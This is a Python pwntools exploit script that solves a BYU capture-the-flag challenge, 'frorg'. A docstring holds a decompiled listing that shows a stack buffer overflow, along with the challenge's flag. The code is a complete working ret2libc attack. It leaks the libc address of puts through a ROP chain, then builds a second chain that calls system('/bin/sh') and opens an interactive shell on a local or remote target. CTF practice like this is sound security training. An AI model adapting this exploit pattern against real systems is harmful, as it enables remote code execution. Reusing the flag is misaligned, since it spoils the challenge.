#!/usr/bin/env python3


"""
Ghidra decompile

undefined8 main(void)

{
  int num_frogs;
  undefined frog_array [44];
  int current_frog;

  puts(
      "I love frorggies so much! So much I made this application to store all the frorgie names you  want"
      );
  puts("How many frorgies you want to store? ");
  __isoc99_scanf(&format_percent_d,&num_frogs);
  for (current_frog = 0; current_frog < num_frogs; current_frog = current_frog + 1) {
    puts("Enter frorgy name: ");
    read(0,frog_array + current_frog * 10,10);
  }
  puts("Thank you!");
  return 0;
}


It's not checking how many frorggies we enter versus how many it writes to.

Should be able to perform a ret2libc by overwriting return address on stack
byuctf{fr0rg13s_s4y_rib1t_rib1t}
"""

from pwn import *


exe = ELF("./frorg_patched")
libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.36.so")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       b *main+159
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting ğŸ”¥")
    r.recvuntil(b'How many frorgies you want to store?')

    log.progress("Crafting first payload ğŸº ")
    payload = b'22\n'
    payload += b'A'*44
    payload += b'\x04\x00\x00\x00'

    log.progress("Building first rop chain ğŸ‘·")
    rop = ROP(exe)
    pop_rdi = rop.rdi.address

    log.progress("pop rdi gadget: ",    hex(pop_rdi)) 
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    # This magic bit runs down the stack until we reach a stack address
    # so that the rbp is set correctly
    for x in range(0,16):
        payload += p64(pop_rdi)
    payload += p64(exe.sym['main'])

    log.progress("Sending first rop chain ğŸ’£")
    r.send(payload)
    r.recvuntil(b'Thank you!\n')
    
    log.progress("Processing leaks ğŸš°")
    leaked_puts = u64(r.recvline()[0:6]+b'\x00\x00')
    log.progress("Libc puts leak: ", hex(leaked_puts))
    libc.address = leaked_puts - libc.sym['puts']
    log.progress("Libc leak: ", hex(libc.address))


    log.progress("Crafting second payload ğŸº ")
    payload = b'9\n'
    payload += b'A'*44
    payload += b'\x04\x00\x00\x00'

    log.progress("Finding gadgets ğŸ”")
    system = libc.sym['system']
    log.progress("Libc system: ", hex(system))
    binsh = next(libc.search(b'/bin/sh'))
    log.progress("Libc binsh: ", hex(binsh))
    ret = rop.ret.address

    log.progress("Building second rop chain ğŸ‘·")
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system)

    log.progress("Sending second rop chain ğŸ’£")
    r.send(payload)
    r.recvuntil(b'Thank you!\n')

    log.progress("Popping shell ğŸ’¥")
    r.interactive()



if __name__ == "__main__":
    main()

